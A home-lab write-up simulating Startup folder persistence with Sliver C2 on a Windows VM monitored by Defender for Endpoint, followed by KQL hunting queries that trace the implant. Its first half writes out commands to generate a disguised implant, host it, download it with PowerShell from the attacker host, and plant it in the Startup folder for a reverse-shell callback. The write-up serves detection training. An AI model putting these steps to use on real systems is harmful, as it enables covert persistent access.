# Startup Folder Persistence via Sliver C2
**Technique: [T1547.009 – Shortcut Modification (Startup Folder)](https://attack.mitre.org/techniques/T1547/009/)**

The Startup folder is a reliable persistence mechanism abused by adversaries to execute malicious binaries that will run every time that user account logs in.  

In this simulation, a payload is created and hosted using [Sliver C2](https://github.com/BishopFox/sliver), then manually placed in the user's Startup folder on the target host. [Microsoft Defender for Endpoint (MDE)](https://www.microsoft.com/en-us/security/business/threat-protection/microsoft-defender-endpoint) is left active to observe telemetry and detection behavior.  

> This test builds on my previous [Registry Run Key](https://github.com/j-manli/soc-analyst-notebook/blob/main/investigations/run_key_persistence_sliver_c2.md) persistence write up.
> Using the same payload, we now explore Startup Folder persistence.


---

## Host Configuration

- **Attacker VM:** `HR-COMPLAINTS` (Sliver C2 on Ubuntu 22.04)
  - **IP:** `10.1.0.51`
- **Target VM:** `CEO-LAPTOP` (Windows 10 with MDE onboarded)
  - **IP:** `10.1.0.69`
  - **Admin Username:** `TrustMeBro`


---

<details>
<summary><strong>🔹 Step 1: Generate and Host Payload (Attacker VM)</strong></summary>

&nbsp;

From `HR-COMPLAINTS`, we generate a Windows executable using [Sliver C2](https://github.com/BishopFox/sliver):

```
# Start Sliver
sudo sliver

# Inside Sliver console:
generate --os windows --format exe --name WindowsTelemetryService --http https://10.1.0.51
```

> `WindowsTelemetryService.exe` is a disguised payload name to blend in with legitimate telemetry binaries often found on Windows systems.


<img width="1007" height="201" alt="sliver_generate_payload" src="https://github.com/user-attachments/assets/cfb4d05f-6847-4d54-82d8-611da2983b52" />

Next, host the payload via Python on port 80 (commonly allowed traffic):

```
sudo python3 -m http.server 80
```

</details>

---  

<details>
<summary><strong>🔹 Step 2: Download Payload & Add to Startup Folder (Target VM)</strong></summary>

&nbsp;

From `CEO-LAPTOP`, use PowerShell to download the payload:

```powershell
wget "http://10.1.0.51/WindowsTelemetryService.exe" -OutFile "C:\ProgramData\WindowsTelemetryService.exe"
```

> ℹ️ **Note:**  
> `C:\ProgramData` is a user-writable, trusted location often used by legitimate applications.  
> Because it doesn’t trigger alerts and doesn’t require elevated permissions, attackers frequently abuse this path for storing payloads discreetly.


Now copy the payload into the current user’s Startup folder:

```powershell
copy "C:\ProgramData\WindowsTelemetryService.exe" "C:\Users\TrustMeBro\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\WindowsTelemetryService.exe"
```

> Dropping an executable into this folder ensures it runs at every user logon.  

<img width="1244" height="254" alt="copying_payload_into_startup_folder" src="https://github.com/user-attachments/assets/1e158d1a-f81f-45eb-99f7-23c09d2d697c" />

</details>  

---  

<details>
<summary><strong>🔹 Step 3: Reboot & Observe Callback</strong></summary>

&nbsp;

Sign out and back into the `TrustMeBro` user session on `CEO-LAPTOP`. Sliver should receive a callback, establishing a new session tied to the Startup Folder.  

<img width="451" height="240" alt="signing_out_of_windows_host" src="https://github.com/user-attachments/assets/fa2e9ff8-3183-4016-8f2d-e8e1f032e23c" />  

&nbsp;
We can verify the beacon using:

```
sessions
```

<img width="1714" height="338" alt="established_session_startup_folder_mde" src="https://github.com/user-attachments/assets/cb30b821-dbaa-4337-9c5f-e956df163e8b" />

The above image also confirms our unique session ID, `efac7d6e`, and demonstrated code execution via the reverse shell by running `whoami`.

</details>  

---  

## Detection: Startup Folder Persistence  

Let's focus our hunting process to answer: *Is something suspicious hiding on our system? If so, where did it come from?*

---

### Incident/Alert and Timeline Overview  

MDE surfaced the following:

- **Alert**: Uncommon file added to the startup folder, Suspected malware written in `Go`  
- **Severity**: `Medium`, `Low`  
- **Detection Source**: Defender for Endpoint (`EDR`), `Antivirus`
&nbsp;

<img width="1797" height="213" alt="startup_folder_incident_alert_timeline" src="https://github.com/user-attachments/assets/7ce5ba9c-8480-4236-a646-ebad6d5a3f11" />  
&nbsp;  

Digging into the Alert Timeline on `CEO-LAPTOP` revealed that:

- `WindowsTelemetryService.exe` was written to the Startup folder via PowerShell

<img width="1117" height="495" alt="startup_folder_alert_timeline_executable_discovery" src="https://github.com/user-attachments/assets/989bf7d5-0d2a-4b00-aef1-499bd0c8d330" />
 

---

### Hunting With KQL

Once we've identified the suspicious file, we can pivot on the file name and ask:  *Was this file executed?*

```kql
DeviceProcessEvents
| where FileName == "WindowsTelemetryService.exe"
| project Timestamp, DeviceName, AccountName, ProcessCommandLine, FolderPath, InitiatingProcessFolderPath
| sort by Timestamp desc
```

We see two launches: one from the registry test (ran previously), another from this Startup Folder test.  
Focusing on the Startup Folder, the output also shows `explorer.exe` as the parent process.  
Since this executable kicks off on login, this makes sense.  

<img width="1690" height="437" alt="startup_folder_execution_kql" src="https://github.com/user-attachments/assets/684af15b-519f-400d-952c-e8712d848dd5" />


---

### Where Did it Come From and What is it Doing?

To answer this, a natural pivot might be to look at network events happening around the time of the observered alert to gain better context of what's happening.

```kql
DeviceNetworkEvents
| where DeviceName == "ceo-laptop"
| where Timestamp between (datetime(2025-07-13 02:30:00) .. datetime(2025-07-13 02:45:00))
| project Timestamp, RemoteIP, RemotePort, RemoteUrl, InitiatingProcessFileName, InitiatingProcessCommandLine
| sort by Timestamp asc
```

<img width="1141" height="365" alt="network_connection_powershell_discovery_kql" src="https://github.com/user-attachments/assets/074555c6-9e06-444c-9bd1-f00a8611b137" />


The above image shows PowerShell connecting to an internal remote IP, `10.1.0.51` on `port 80`.
> Workstation to workstation communication is uncommon, if not, rare in most environments and worth investigating.

---

### Investigating Attacker IP Activity

To verify callback activity:

```kql
DeviceNetworkEvents
| where DeviceName == "ceo-laptop"
| where RemoteIP == "10.1.0.51"
| project Timestamp, DeviceName, ActionType, RemoteIP, RemotePort, LocalIP, LocalPort, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessParentFileName
```

<img width="1699" height="629" alt="powershell_and_suspicious_process_remote_connection_kql" src="https://github.com/user-attachments/assets/c6257571-733e-42aa-8d59-c5522cc6e6ea" />


Confirmed: `WindowsTelemetryService.exe` initiated TCP connections after logon on `port 443`.

---

## Takeaways

This scenario showed how an attacker could use a user’s Startup folder as a simple way to stay persistent and regain access after a reboot. 
Microsoft Defender for Endpoint picked up some of the activity, but linking the initial execution to the later callback wasn’t immediately obvious and required more investigation.
Reviewing the timeline made it clearer how Startup folder persistence can blend in with normal user activity, since programs launching at logon are expected and easy to miss. 
It also showed that the autorun event by itself wasn’t enough, and that tying the logon-based execution to later network activity was necessary to understand what was actually happening.
